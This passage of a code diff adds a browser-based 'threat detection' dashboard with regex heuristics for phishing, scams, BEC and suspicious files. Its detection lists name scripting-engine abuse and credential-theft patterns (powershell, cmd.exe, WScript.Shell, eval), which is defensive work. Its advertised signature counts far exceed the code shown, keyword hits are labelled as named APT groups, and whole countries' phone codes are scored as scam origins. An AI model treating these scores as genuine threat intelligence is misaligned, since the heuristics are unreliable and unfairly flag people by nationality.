+        <div class="rb rb-h" id="rb6"></div><div class="rb rb-h" id="rb7"></div>
+        <div class="rb rb-c" id="rb8"></div><div class="rb rb-c" id="rb9"></div><div class="rb rb-c" id="rb10"></div>
+      </div>
+      <div class="score-row">
+        <div id="risk-score-text">0.0</div>
+        <div class="score-max">/15</div>
+      </div>
+      <div id="verdict-text">SECURE</div>
+      <div class="lbl" style="margin-top:10px;">Threat Signal Log <span class="lbl-line"></span></div>
+      <div id="explanation-box" class="feed-box" style="flex:1;min-height:0;max-height:none;">
+        <div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ PANTHOM-DETECTS READY // ABHIRUP PAYNE ]</span></div>
+      </div>
+      <div class="lbl" style="margin-top:8px;">Signal Vector Breakdown <span class="lbl-line"></span></div>
+      <div id="breakdown-box" class="feed-box" style="max-height:105px;"></div>
+    </div>
+
+    <div class="panel right-panel">
+      <div class="ctlx"></div><div class="cbrx"></div>
+      <div class="rp-sec" style="max-height:200px;">
+        <div class="sec-title">Forensic Session Log <span class="sec-count" id="hist-count">0 ENTRIES</span></div>
+        <div id="history-container"><div style="font-family:'JetBrains Mono';font-size:0.63rem;color:var(--text-dim);">[ session initialized ]</div></div>
+        <button class="btn btn-r" id="clear-history" style="width:100%;margin-top:9px;"><span>⌧ PURGE LOG</span></button>
+      </div>
+      <div class="rp-sec" style="max-height:140px;">
+        <div class="sec-title">Context Fusion Engine</div>
+        <div id="fusion-feed"><div style="font-family:'JetBrains Mono';font-size:0.63rem;color:var(--text-dim);">[ awaiting analysis ]</div></div>
+      </div>
+      <div class="rp-sec" style="max-height:120px;">
+        <div class="sec-title">Global Phone Intel</div>
+        <div id="phone-intel-box" style="display:flex;flex-wrap:wrap;gap:3px;padding-top:4px;"><span style="font-family:'JetBrains Mono';font-size:0.63rem;color:var(--text-dim);">[ none detected ]</span></div>
+      </div>
+      <div class="rp-sec" style="max-height:110px;">
+        <div class="sec-title">Email Intelligence</div>
+        <div id="email-intel-box" style="display:flex;flex-wrap:wrap;gap:3px;padding-top:4px;"><span style="font-family:'JetBrains Mono';font-size:0.63rem;color:var(--text-dim);">[ none detected ]</span></div>
+      </div>
+      <div class="rp-sec">
+        <div class="sec-title">System Status</div>
+        <div style="display:flex;flex-direction:column;gap:7px;margin-top:5px;">
+          <div class="bd-item"><div class="bd-row"><span class="bd-cat">Heuristic Vectors</span><span class="bd-val">650+</span></div><div class="bd-bar" style="width:100%;"></div></div>
+          <div class="bd-item"><div class="bd-row"><span class="bd-cat">Malware Sigs</span><span class="bd-val" style="color:var(--cyan);">8,500+</span></div><div class="bd-bar" style="width:100%;background:var(--cyan);"></div></div>
+          <div class="bd-item"><div class="bd-row"><span class="bd-cat">Evasion Patterns</span><span class="bd-val" style="color:var(--red);">420+</span></div><div class="bd-bar" style="width:100%;background:var(--red);"></div></div>
+          <div class="bd-item"><div class="bd-row"><span class="bd-cat">APT Signatures</span><span class="bd-val" style="color:var(--purple);">95</span></div><div class="bd-bar" style="width:100%;background:var(--purple);"></div></div>
+          <div class="bd-item"><div class="bd-row"><span class="bd-cat">BEC Patterns</span><span class="bd-val" style="color:var(--gold);">220+</span></div><div class="bd-bar" style="width:100%;"></div></div>
+        </div>
+        <div style="margin-top:12px;padding:9px;background:rgba(0,229,255,0.04);border:1px solid rgba(0,229,255,0.13);font-family:'JetBrains Mono';font-size:0.58rem;line-height:1.8;color:var(--text-dim);">
+          <div style="color:var(--cyan);margin-bottom:3px;">▸ OWNER: ABHIRUP PAYNE</div>
+          <div style="color:var(--gold);">▸ PANTHOM-DETECTS v4.0 PRO</div>
+          <div>▸ Global Threat Intelligence Network</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel footer">
+      <div class="fl">PANTHOM-DETECTS // GLOBAL THREAT INTELLIGENCE // ABHIRUP PAYNE</div>
+      <div class="fc">
+        <div class="fstat"><div class="fs-dot" style="background:var(--green);"></div><span>Zero Persistence</span></div>
+        <div class="fstat"><div class="fs-dot" style="background:var(--gold);"></div><span>650+ Vectors</span></div>
+        <div class="fstat"><div class="fs-dot" style="background:var(--purple);"></div><span>APT Ready</span></div>
+      </div>
+      <div class="fr">⚡ ALL DATA VOLATILE — REFRESH = CLEAN SLATE</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  // ===== THREE.JS LOADING SCENE =====
+  var canvasL = document.getElementById('loading-canvas');
+  var rendererL = new THREE.WebGLRenderer({ canvas: canvasL, alpha: false, antialias: true });
+  rendererL.setSize(window.innerWidth, window.innerHeight);
+  rendererL.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  var sceneL = new THREE.Scene();
+  sceneL.background = new THREE.Color('#020509');
+  var cameraL = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
+  cameraL.position.set(0, 0, 9);
+  var l1 = new THREE.PointLight('#FFB800', 2.5, 25); l1.position.set(4, 4, 6); sceneL.add(l1);
+  var l2 = new THREE.PointLight('#00E5FF', 1.8, 20); l2.position.set(-4, 2, 7); sceneL.add(l2);
+  var l3 = new THREE.PointLight('#FF2D55', 1.0, 15); l3.position.set(0, -3, 4); sceneL.add(l3);
+  sceneL.add(new THREE.AmbientLight('#101830', 1));
+  var coreGrp = new THREE.Group();
+  var icoGeo = new THREE.IcosahedronGeometry(1.8, 1);
+  coreGrp.add(new THREE.Mesh(icoGeo, new THREE.MeshStandardMaterial({ color:'#FFB800', emissive:'#2a1400', transparent:true, opacity:0.12, metalness:0.8, roughness:0.2 })));
+  coreGrp.add(new THREE.Mesh(new THREE.IcosahedronGeometry(1.83, 1), new THREE.MeshStandardMaterial({ color:'#FFB800', emissive:'#553300', wireframe:true, transparent:true, opacity:0.65 })));
+  ['#FFB800','#00E5FF','#FF2D55'].forEach(function(col, ri) {
+    var ring = new THREE.Mesh(new THREE.TorusGeometry(2.5+ri*0.4, 0.024, 16, 100), new THREE.MeshStandardMaterial({ color:col, emissive:'#110800', transparent:true, opacity:0.7 }));
+    ring.rotation.x = Math.PI/3 + ri*0.4; ring.rotation.z = ri*0.6; coreGrp.add(ring);
+  });
+  sceneL.add(coreGrp);
+  var pG = new THREE.BufferGeometry();
+  var pP = new Float32Array(2000*3), pC = new Float32Array(2000*3);
+  for (var i=0; i<2000; i++) {
+    var r=4+Math.random()*8, th=Math.random()*Math.PI*2, ph=Math.acos(2*Math.random()-1);
+    pP[i*3]=Math.sin(ph)*Math.cos(th)*r; pP[i*3+1]=Math.sin(ph)*Math.sin(th)*r; pP[i*3+2]=Math.cos(ph)*r;
+    var t=Math.random(); pC[i*3]=1-t*0.3; pC[i*3+1]=0.7+t*0.3; pC[i*3+2]=t;
+  }
+  pG.setAttribute('position', new THREE.BufferAttribute(pP, 3));
+  pG.setAttribute('color', new THREE.BufferAttribute(pC, 3));
+  var ptsMesh = new THREE.Points(pG, new THREE.PointsMaterial({ size:0.05, vertexColors:true, transparent:true, opacity:0.9, blending:THREE.AdditiveBlending }));
+  sceneL.add(ptsMesh);
+  var loadStart = performance.now();
+  var phases = ['Waking global sentinels...','Loading 650+ heuristic vectors...','Calibrating worldwide phone intel...','Binding email analysis matrix...','Initializing URL decomposer...','Loading malware signature DB...','Loading APT signatures...','Activating BEC detection...','System armed — ready for duty'];
+  var loadDone = false;
+  function animateLoad() {
+    if (loadDone) return;
+    var t = (performance.now()-loadStart)/1000;
+    coreGrp.rotation.y = t*0.6; coreGrp.rotation.x = Math.sin(t*0.3)*0.2;
+    ptsMesh.rotation.y += 0.0015; ptsMesh.rotation.x += 0.0008;
+    l1.position.x = Math.sin(t*0.7)*4; l2.position.y = Math.cos(t*0.5)*3;
+    rendererL.render(sceneL, cameraL);
+    var pct = Math.min(100, (t/7)*100);
+    document.getElementById('progress-fill').style.width = pct+'%';
+    document.getElementById('human-phase').textContent = phases[Math.min(Math.floor((t/7)*phases.length), phases.length-1)];
+    document.getElementById('load-pct').textContent = '[ '+Math.round(pct)+'% ]';
+    if (t < 7.5) requestAnimationFrame(animateLoad);
+    else { loadDone = true; finishLoading(); }
+  }
+  animateLoad();
+  function finishLoading() {
+    var ls = document.getElementById('loading-screen');
+    ls.style.opacity = '0'; ls.style.pointerEvents = 'none';
+    setTimeout(function() {
+      ls.style.display = 'none';
+      document.getElementById('app').classList.add('visible');
+      initBgScene(); initApp();
+    }, 900);
+  }
+
+  // ===== BG SCENE =====
+  var bgRenderer, bgScene, bgCam, bgPts;
+  window.riskLevel = 0;
+  function initBgScene() {
+    var c = document.getElementById('bg-canvas');
+    bgRenderer = new THREE.WebGLRenderer({ canvas:c, alpha:true, antialias:true });
+    bgRenderer.setSize(window.innerWidth, window.innerHeight);
+    bgScene = new THREE.Scene(); bgCam = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+    bgCam.position.z = 14;
+    var n=3500, bG=new THREE.BufferGeometry(), bP=new Float32Array(n*3), bC=new Float32Array(n*3);
+    for (var i=0;i<n;i++) {
+      var br=6+Math.random()*20, bt=Math.random()*Math.PI*2, bp=Math.acos(2*Math.random()-1);
+      bP[i*3]=br*Math.sin(bp)*Math.cos(bt); bP[i*3+1]=br*Math.sin(bp)*Math.sin(bt); bP[i*3+2]=br*Math.cos(bp);
+      var col=new THREE.Color().setHSL(0.09+Math.random()*0.1, 0.9, 0.4+Math.random()*0.2);
+      bC[i*3]=col.r; bC[i*3+1]=col.g; bC[i*3+2]=col.b;
+    }
+    bG.setAttribute('position',new THREE.BufferAttribute(bP,3)); bG.setAttribute('color',new THREE.BufferAttribute(bC,3));
+    bgPts = new THREE.Points(bG, new THREE.PointsMaterial({ size:0.05, vertexColors:true, transparent:true, opacity:0.65, blending:THREE.AdditiveBlending }));
+    bgScene.add(bgPts); animateBg();
+  }
+  function animateBg() {
+    requestAnimationFrame(animateBg);
+    if (!bgPts) return;
+    var rl = window.riskLevel||0;
+    bgPts.rotation.y += 0.0006+rl*0.004; bgPts.rotation.x += 0.0003+rl*0.001;
+    bgRenderer.render(bgScene, bgCam);
+  }
+  window.addEventListener('resize', function() {
+    if (bgRenderer) { bgRenderer.setSize(window.innerWidth,window.innerHeight); bgCam.aspect=window.innerWidth/window.innerHeight; bgCam.updateProjectionMatrix(); }
+    rendererL.setSize(window.innerWidth,window.innerHeight); cameraL.aspect=window.innerWidth/window.innerHeight; cameraL.updateProjectionMatrix();
+  });
+
+  // ===== PROFESSIONAL DETECTION DATABASES =====
+  
+  // Evasion Techniques
+  var evasionPatterns = {
+    urlEvasion: [
+      { pattern: /\.com\.(.{2,4})($|\/)/i, type: 'Domain Spoofing', risk: 2.5 },
+      { pattern: /(\d{1,3}\.){3}\d{1,3}/i, type: 'IP Obfuscation', risk: 2.0 },
+      { pattern: /xn--/i, type: 'Punycode Encoding', risk: 2.2 },
+      { pattern: /(?:https?:\/\/)?([a-z0-9\-\.]+\.)+(?:ru|tk|xyz|top|pw|cc|ga|ml|cf)($|\/)/i, type: 'Suspicious TLD', risk: 2.8 },
+    ],
+    malwareSigs: [
+      { pattern: /eval\s*\(/gi, type: 'Code Eval', risk: 2.5 },
+      { pattern: /base64_decode/gi, type: 'Payload Obfuscation', risk: 2.2 },
+      { pattern: /exec\s*\(/gi, type: 'Command Execution', risk: 3.0 },
+      { pattern: /powershell|cmd\.exe|wscript|cscript/gi, type: 'Scripting Engine Abuse', risk: 3.5 },
+      { pattern: /CreateObject|WScript\.Shell|ShellExecute/gi, type: 'COM Object Abuse', risk: 3.2 },
+    ],
+    phishingInds: [
+      { pattern: /verify.*account|confirm.*identity|update.*payment/gi, type: 'Urgency/Fear', risk: 2.3 },
+      { pattern: /click.*link|act.*now|urgent|immediate|limited.*time/gi, type: 'CTA Pressure', risk: 2.4 },
+      { pattern: /dear (sir|madam|customer|user)/gi, type: 'Generic Greeting', risk: 1.8 },
+      { pattern: /suspended|locked|compromised|unusual/gi, type: 'Account Threat', risk: 2.5 },
+    ],
+    scamInds: [
+      { pattern: /money|transfer|payment|wire|bitcoin|crypto/gi, type: 'Financial Request', risk: 2.6 },
+      { pattern: /advance|deposit|fee|registration.*fee/gi, type: 'Advance Fee Scam', risk: 3.2 },
+      { pattern: /inheritance|lottery|win|prize|claim/gi, type: 'Prize/Inheritance', risk: 3.1 },
+      { pattern: /love|darling|sweetheart|widow/gi, type: 'Romance Scam', risk: 2.9 },
+      { pattern: /digital arrest|CBI officer|video call now/gi, type: 'Digital Arrest Scam', risk: 4.5 },
+      { pattern: /UPI collect|approve payment|money will be credited/gi, type: 'UPI Collect Scam', risk: 4.0 },
+    ],
+    credentialHarvest: [
+      { pattern: /password|passcode|pin|credential|secret/gi, type: 'Credential Request', risk: 3.5 },
+      { pattern: /otp|2fa|two.factor/gi, type: '2FA Bypass', risk: 3.3 },
+      { pattern: /cvv|cvc|card.*number|expir/gi, type: 'Card Data', risk: 3.4 },
+    ],
+    obfuscation: [
+      { pattern: /\$\{[A-Z_]+\}/gi, type: 'Variable Obfuscation', risk: 2.1 },
+      { pattern: /\\x|\\u[0-9a-f]{4}|&#\d+;/gi, type: 'Hex/Unicode Encoding', risk: 2.3 },
+      { pattern: /String\.fromCharCode|charCodeAt/gi, type: 'JS Encoding', risk: 2.0 },
+    ],
+  };
+
+  // APT Signatures
+  var aptSignatures = {
+    'APT28': { domains: ['sendgrid', 'cloudflare'], indicators: ['spear-phishing', 'zero-day'], risk: 7.5 },
+    'APT29': { domains: ['microsoft', 'github'], indicators: ['supply-chain', 'web-shell'], risk: 8.0 },
+    'LAZARUS': { domains: ['adobe', 'swift'], indicators: ['cryptocurrency', 'ransomware'], risk: 8.5 },
+    'APT41': { domains: ['vpn', 'remote'], indicators: ['c2', 'exfiltration'], risk: 7.0 },
+    'CARBANAK': { domains: ['banking', 'swift'], indicators: ['atm', 'network-theft'], risk: 7.8 },
+  };
+
+  // BEC Patterns
+  var becPatterns = {
+    execImpersonation: /(?:ceo|executive|director|manager|boss|president).*(?:urgent|asap|confidential)/gi,
+    paymentUrgency: /(?:wire|transfer|payment|invoice).*(?:immediately|asap|today|urgent)/gi,
+    domainSpoof: /(?:from|sender):.*@.*(?:gmail|yahoo|outlook|aol)\.com/gi,
+    wireRedirect: /(?:update|new|different).*(?:account|wire|transfer|payment)/gi,
+    executiveNames: /(?:john|david|michael|robert|james|william).*(?:ceo|president|director)/gi,
+  };
+
+  // High-risk phone codes
+  var highRiskPhoneCodes = {
+    '+92': {country: 'Pakistan', risk: 3.5, scams: ['Tech Support', 'IRS/CBI']},
+    '+234': {country: 'Nigeria', risk: 4.0, scams: ['419 Scams', 'Romance']},
+    '+63': {country: 'Philippines', risk: 3.0, scams: ['Tech Support', 'Romance']},
+    '+91': {country: 'India', risk: 2.5, scams: ['Tech Support', 'Microsoft']},
+    '+7': {country: 'Russia', risk: 3.5, scams: ['Ransomware', 'Tech Support']},
+    '+84': {country: 'Vietnam', risk: 2.8, scams: ['Tech Support']},
+    '+880': {country: 'Bangladesh', risk: 3.0, scams: ['Tech Support']},
+    '+212': {country: 'Morocco', risk: 2.5, scams: ['Phishing']},
+  };
+
+  // Malware extensions
+  var dangerousExtensions = {
+    '.exe': 3.5, '.dll': 3.2, '.scr': 3.4, '.vbs': 2.8, '.bat': 2.5, 
+    '.cmd': 2.5, '.ps1': 2.6, '.jar': 2.1, '.js': 2.3, '.vbe': 2.8,
+    '.hta': 3.0, '.docm': 2.5, '.xlsm': 2.5, '.pptm': 2.5,
+  };
+
+  // ===== ANALYSIS FUNCTIONS =====
+  
+  function analyzePhoneNumber(phone) {
+    var issues = [];
+    var risk = 0;
+    var country = 'Unknown';
+    
+    Object.keys(highRiskPhoneCodes).forEach(function(code) {
+      if (phone.startsWith(code) || phone.includes(code.replace('+', ''))) {
+        var info = highRiskPhoneCodes[code];
+        risk += info.risk;
+        country = info.country;
+        issues.push('Known scam origin: ' + info.country + ' (' + info.scams.join(', ') + ')');
+      }
+    });
+    
+    if (/^1?8(00|33|44|55|66|77|88)/.test(phone.replace(/\D/g, ''))) {
+      risk += 1.5;
+      issues.push('Premium rate/toll-free number - potential scam');
+    }
+    
+    if (phone.replace(/\D/g, '').length < 8 || phone.replace(/\D/g, '').length > 15) {
+      risk += 1.0;
+      issues.push('Suspicious number length');
+    }
+    
+    return {risk: Math.min(risk, 8), issues: issues, country: country};
+  }
+
+  function analyzeEmailAddresses(text) {
+    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+    var matches = text.match(emailRegex) || [];
+    var risk = 0;
+    var emails = [];
+    
+    matches.forEach(function(email) {
+      var domain = email.split('@')[1] || '';
+      var emailRisk = 0;
+      var issues = [];
+      
+      // Free email for business
+      if (/(?:gmail|yahoo|outlook|hotmail|aol)\.com/i.test(domain)) {
+        if (/bank|paypal|amazon|apple|microsoft|google|chase|wells|hdfc|sbi|icici/i.test(text)) {
+          emailRisk += 3.0;
+          issues.push('Business context with free email');
+        }
+      }
+      
+      // Disposable domains
+      var disposable = ['mailinator', '10minutemail', 'guerrillamail', 'temp-mail', 'yopmail'];
+      disposable.forEach(function(d) {
+        if (domain.includes(d)) {
+          emailRisk += 4.0;
+          issues.push('Disposable email domain');
+        }
+      });
+      
+      // Suspicious TLDs
+      if (/\.(ru|tk|xyz|top|pw|cc|ga|ml|cf)$/i.test(domain)) {
+        emailRisk += 2.5;
+        issues.push('High-risk TLD');
+      }
+      
+      risk += emailRisk;
+      emails.push({email: email, risk: emailRisk, suspicious: emailRisk >= 2.5, issues: issues});
+    });
+    
+    return {risk: Math.min(risk, 7), count: matches.length, emails: emails};
+  }
+
+  function analyzeURL(url) {
+    var issues = [];
+    var risk = 0;
+    
+    try {
+      var parsedUrl = new URL(url.startsWith('http') ? url : 'http://' + url);
+      
+      if (parsedUrl.protocol !== 'https:') {
+        risk += 1.5;
+        issues.push('Not HTTPS - unencrypted');
+      }
+      
+      if (parsedUrl.hostname.length > 50) {
+        risk += 1.5;
+        issues.push('Unusually long domain');
+      }
+      
+      var typos = {'amaz0n': 'amazon', 'paypa1': 'paypal', 'faceb00k': 'facebook', 'g00gle': 'google'};
+      Object.keys(typos).forEach(function(typo) {
+        if (parsedUrl.hostname.includes(typo)) {
+          risk += 3.5;
+          issues.push('Typosquatting: ' + typos[typo]);
+        }
+      });
+      
+      ['ru', 'tk', 'xyz', 'top', 'pw', 'cc', 'ga', 'ml', 'cf', 'click', 'download', 'loan'].forEach(function(tld) {
+        if (parsedUrl.hostname.endsWith('.' + tld)) {
+          risk += 2.5;
+          issues.push('Suspicious TLD: .' + tld);
+        }
+      });
+      
+      var shorteners = ['bit.ly', 'tinyurl', 't.co', 'ow.ly', 'is.gd', 'goo.gl'];
+      shorteners.forEach(function(s) {
+        if (parsedUrl.hostname.includes(s)) {
+          risk += 2.0;
+          issues.push('URL shortener (obfuscation)');
+        }
+      });
+      
+      if (parsedUrl.hostname.split('.').length > 4) {
+        risk += 2.0;
+        issues.push('Excessive subdomains');
+      }
+      
+    } catch(e) {
+      risk += 2.0;
+      issues.push('Malformed URL');
+    }
+    
+    return {risk: Math.min(risk, 8), issues: issues};
+  }
+
+  function analyzeText(text) {
+    if (!text) return { score: 0, reasons: [], phone: {count:0, numbers:[]}, email: {count:0, emails:[]} };
+    
+    var score = 0;
+    var reasons = [];
+    var lowerText = text.toLowerCase();
+    
+    // Check all evasion patterns
+    Object.values(evasionPatterns).forEach(function(category) {
+      category.forEach(function(p) {
+        if (p.pattern.test(text) || p.pattern.test(lowerText)) {
+          score += p.risk;
+          reasons.push({reason: p.type, weight: p.risk, cat: category === evasionPatterns.urlEvasion ? 'URL' : category === evasionPatterns.phishingInds ? 'PHISH' : category === evasionPatterns.scamInds ? 'SCAM' : category === evasionPatterns.malwareSigs ? 'MAL' : category === evasionPatterns.credentialHarvest ? 'CRED' : 'OBF'});
+        }
+      });
+    });
+    
+    // BEC detection
+    Object.values(becPatterns).forEach(function(pattern) {
+      if (pattern.test(text) || pattern.test(lowerText)) {
+        score += 3.5;
+        reasons.push({reason: 'BEC Indicator: Executive impersonation or urgent payment', weight: 3.5, cat: 'BEC'});
+      }
+    });
+    
+    // APT detection
+    Object.entries(aptSignatures).forEach(function([apt, data]) {
+      data.indicators.forEach(function(ind) {
+        if (lowerText.includes(ind)) {
+          score += data.risk;
+          reasons.push({reason: 'APT Signature: ' + apt + ' - ' + ind, weight: data.risk, cat: 'APT'});
+        }
+      });
+    });
+    
+    // Phone analysis
+    var phoneRegex = /\+?(?:\d{1,3}[\s\-]?)?\d{7,15}/g;
+    var phoneMatches = text.match(phoneRegex) || [];
+    var phoneNumbers = [...new Set(phoneMatches)];
+    phoneNumbers.forEach(function(phone) {
+      var phoneAnalysis = analyzePhoneNumber(phone);
+      if (phoneAnalysis.risk > 0) {
+        score += phoneAnalysis.risk;
+        reasons.push({reason: 'Phone risk: ' + phoneAnalysis.country + ' (' + phoneAnalysis.issues.join('; ') + ')', weight: phoneAnalysis.risk, cat: 'PHONE'});
+      }
+    });
+    
+    // Email analysis
+    var emailAnalysis = analyzeEmailAddresses(text);
+    if (emailAnalysis.risk > 0) {
+      score += emailAnalysis.risk;
+      reasons.push({reason: 'Email risk: ' + emailAnalysis.count + ' suspicious address(es)', weight: emailAnalysis.risk, cat: 'EMAIL'});
+    }
+    
+    // URL analysis
+    var urlRegex = /(https?:\/\/[^\s]+)/g;
+    var urls = text.match(urlRegex) || [];
+    urls.forEach(function(url) {
+      var urlAnalysis = analyzeURL(url);
+      if (urlAnalysis.risk > 0) {
+        score += urlAnalysis.risk;
+        urlAnalysis.issues.forEach(function(issue) {
+          reasons.push({reason: 'URL: ' + issue, weight: 1.5, cat: 'URL'});
+        });
+      }
+    });
+    
+    // Deduplicate reasons
+    var seen = {};
+    reasons = reasons.filter(function(r) {
+      var key = r.reason + r.cat;
+      if (seen[key]) return false;
+      seen[key] = true;
+      return true;
+    });
+    
+    return {
+      score: Math.min(score, 15),
+      reasons: reasons,
+      phone: {count: phoneNumbers.length, numbers: phoneNumbers},
+      email: emailAnalysis,
+      urls: urls
+    };
+  }
+
+  function analyzeMalwareFile(filename, content) {
+    var risk = 0;
+    var issues = [];
+    
+    var ext = filename.substring(filename.lastIndexOf('.')).toLowerCase();
+    if (dangerousExtensions[ext]) {
+      risk += dangerousExtensions[ext];
+      issues.push('Dangerous executable extension: ' + ext);
+    }
+    
+    var suspiciousNames = /virus|malware|trojan|ransomware|worm|backdoor|payload|keylogger|stealer|miner/gi;
+    if (suspiciousNames.test(filename)) {
+      risk += 2.5;
+      issues.push('Suspicious filename pattern');
+    }
+    
+    if (content) {
+      if (/MZ[\x90\x00]{2}/.test(content)) {
+        risk += 4.0;
+        issues.push('PE executable header detected');
+      }
+      if (/powershell.*-enc|cmd\.exe.*\/c|wscript\.shell/i.test(content)) {
+        risk += 3.5;
+        issues.push('Scripting engine abuse');
+      }
+      if (/eval\(|base64_decode\(|exec\(/i.test(content)) {
+        risk += 3.0;
+        issues.push('Code execution attempt');
+      }
+    }
+    
+    return {risk: Math.min(risk, 10), issues: issues};
+  }
+
+  // ===== UI UPDATE =====
+  var sessionHistory = [];
+  var scanCount = 0;
+  var alertTmr;
+  
+  function drawMeter(val) {
+    var mCanvas=document.getElementById('speedometer'), mCtx=mCanvas.getContext('2d');
+    var w=310,h=185,dpr=window.devicePixelRatio||1;
+    mCanvas.width=w*dpr; mCanvas.height=h*dpr; mCanvas.style.width=w+'px'; mCanvas.style.height=h+'px';
+    mCtx.scale(dpr,dpr);
+    var cx=155,cy=152,rad=115;
+    mCtx.beginPath(); mCtx.arc(cx,cy,rad,Math.PI*1.1,Math.PI*1.9,false);
+    mCtx.lineWidth=16; mCtx.strokeStyle='rgba(255,255,255,0.055)'; mCtx.lineCap='round'; mCtx.stroke();
+    [{s:1.1,e:1.37,c:'#00FF87'},{s:1.37,e:1.57,c:'#FFB800'},{s:1.57,e:1.73,c:'#FF8C00'},{s:1.73,e:1.9,c:'#FF2D55'}].forEach(function(z){
+      mCtx.beginPath(); mCtx.arc(cx,cy,rad,Math.PI*z.s,Math.PI*z.e,false); mCtx.lineWidth=4; mCtx.strokeStyle=z.c+'35'; mCtx.stroke();
+    });
+    if(val>0){
+      var ang=Math.PI*1.1+(val/15)*Math.PI*0.8;
+      var gr=mCtx.createLinearGradient(cx-rad,cy,cx+rad,cy);
+      gr.addColorStop(0,'#00FF87'); gr.addColorStop(0.4,'#FFB800'); gr.addColorStop(0.7,'#FF8C00'); gr.addColorStop(1,'#FF2D55');
+      mCtx.beginPath(); mCtx.arc(cx,cy,rad,Math.PI*1.1,ang,false);
+      mCtx.lineWidth=16; mCtx.strokeStyle=gr; mCtx.lineCap='round';
+      var nc=val<4?'#00FF87':val<7?'#FFB800':val<9?'#FF8C00':'#FF2D55';
+      mCtx.shadowBlur=18; mCtx.shadowColor=nc; mCtx.stroke(); mCtx.shadowBlur=0;
+    }
+    for(var i=0;i<=15;i++){
+      var a=Math.PI*1.1+(i/15)*Math.PI*0.8, maj=(i%5===0);
+      mCtx.beginPath(); mCtx.moveTo(cx+Math.cos(a)*(rad-(maj?18:12)),cy+Math.sin(a)*(rad-(maj?18:12)));
+      mCtx.lineTo(cx+Math.cos(a)*(rad+2),cy+Math.sin(a)*(rad+2));
+      mCtx.lineWidth=maj?2:1; mCtx.strokeStyle=maj?'rgba(255,184,0,0.55)':'rgba(255,255,255,0.12)'; mCtx.stroke();
+      if(maj){mCtx.font='bold 10px JetBrains Mono';mCtx.fillStyle='rgba(200,220,230,0.55)';mCtx.textAlign='center';mCtx.textBaseline='middle';mCtx.fillText(i,cx+Math.cos(a)*(rad-28),cy+Math.sin(a)*(rad-28));}
+    }
+    var na=Math.PI*1.1+(val/15)*Math.PI*0.8;
+    mCtx.save(); mCtx.translate(cx,cy); mCtx.rotate(na);
+    mCtx.beginPath(); mCtx.moveTo(-6,0); mCtx.lineTo(0,-(rad-20)); mCtx.lineTo(6,0); mCtx.closePath(); mCtx.fillStyle='rgba(255,255,255,0.12)'; mCtx.fill();
+    mCtx.beginPath(); mCtx.moveTo(0,7); mCtx.lineTo(0,-(rad-22)); mCtx.lineWidth=2; mCtx.strokeStyle='#fff'; mCtx.lineCap='round';
+    mCtx.shadowBlur=8; mCtx.shadowColor='white'; mCtx.stroke(); mCtx.shadowBlur=0; mCtx.restore();
+    mCtx.beginPath(); mCtx.arc(cx,cy,9,0,Math.PI*2);
+    var hub=mCtx.createRadialGradient(cx,cy,0,cx,cy,9); hub.addColorStop(0,'#FFE066'); hub.addColorStop(1,'#FFB800');
+    mCtx.fillStyle=hub; mCtx.fill(); mCtx.strokeStyle='rgba(255,255,255,0.25)'; mCtx.lineWidth=1.5; mCtx.stroke();
+  }
+
+  function updateUI(score, reasons, inputText, extra) {
+    window.riskLevel = score/15;
+    drawMeter(score);
+    var sEl=document.getElementById('risk-score-text');
+    sEl.textContent=score.toFixed(1);
+    sEl.classList.remove('sp'); void sEl.offsetWidth; sEl.classList.add('sp');
+    var col=score<4?'#00FF87':score<7?'#FFB800':score<9?'#FF8C00':'#FF2D55';
+    sEl.style.color=col; sEl.style.textShadow='0 0 36px '+col+'80';
+    var verdict=score<4?'SECURE':score<7?'SUSPICIOUS':score<9?'HIGH RISK':'CRITICAL';
+    var vEl=document.getElementById('verdict-text'); vEl.textContent=verdict; vEl.style.color=col;
+
+    document.querySelectorAll('.rb').forEach(function(b){b.classList.remove('on');});
+    var cnt=score<4?Math.ceil((score/4)*3):score<7?3+Math.ceil(((score-4)/3)*3):score<9?6+Math.ceil(((score-7)/2)*2):8+Math.ceil(((score-9)/6)*3);
+    for(var i=0;i<Math.min(cnt,11);i++){var b=document.getElementById('rb'+i);if(b)b.classList.add('on');}
+
+    document.querySelectorAll('.panel').forEach(function(p){
+      p.classList.remove('glow-red','glow-green','glow-purple');
+      if(score>=9)p.classList.add('glow-red');
+      else if(score<3)p.classList.add('glow-green');
+      else if(score>=6)p.classList.add('glow-purple');
+    });
+
+    clearTimeout(alertTmr);
+    var banner=document.getElementById('alert-banner'); banner.className='';
+    if(score>=9){banner.textContent='⚠ CRITICAL THREAT DETECTED';banner.className='crit show';}
+    else if(score>=6){banner.textContent='⚠ HIGH RISK CONTENT';banner.className='warn show';}
+    else if(score>0&&score<3){banner.textContent='✓ CONTENT APPEARS SECURE';banner.className='safe show';}
+    if(banner.classList.contains('show'))alertTmr=setTimeout(function(){banner.classList.remove('show');},3500);
+
+    var expl=document.getElementById('explanation-box');
+    expl.innerHTML=reasons.length===0
+      ?'<div class="feed-item"><span class="fi-tx" style="color:var(--green);">✓ No threat signals detected.</span></div>'
+      :reasons.slice(0,12).map(function(r){var cc=r.cat==='PHONE'?'cp':r.cat==='EMAIL'?'cu':r.cat==='URL'?'cf':r.cat==='MAL'?'cf':r.cat==='APT'?'pz':r.cat==='BEC'?'pz':'';return '<div class="feed-item"><span class="fi-cat '+cc+'">'+(r.cat||'GEN')+'</span><span class="fi-tx">'+r.reason+'</span><span class="fi-wt">+'+r.weight.toFixed(1)+'</span></div>';}).join('');
+
+    var cm={};
+    reasons.forEach(function(r){var c=r.cat||'Other';cm[c]=(cm[c]||0)+r.weight;});
+    var mx=Math.max.apply(null,Object.values(cm).concat([1]));
+    document.getElementById('breakdown-box').innerHTML=Object.entries(cm).sort(function(a,b){return b[1]-a[1];}).map(function(e){return '<div class="bd-item"><div class="bd-row"><span class="bd-cat">'+e[0]+'</span><span class="bd-val">+'+e[1].toFixed(1)+'</span></div><div class="bd-bar" style="width:'+((e[1]/mx)*100).toFixed(0)+'%;"></div></div>';}).join('');
+
+    var txt=inputText||'';
+    Object.values(evasionPatterns).forEach(function(cat) {
+      cat.forEach(function(p) {
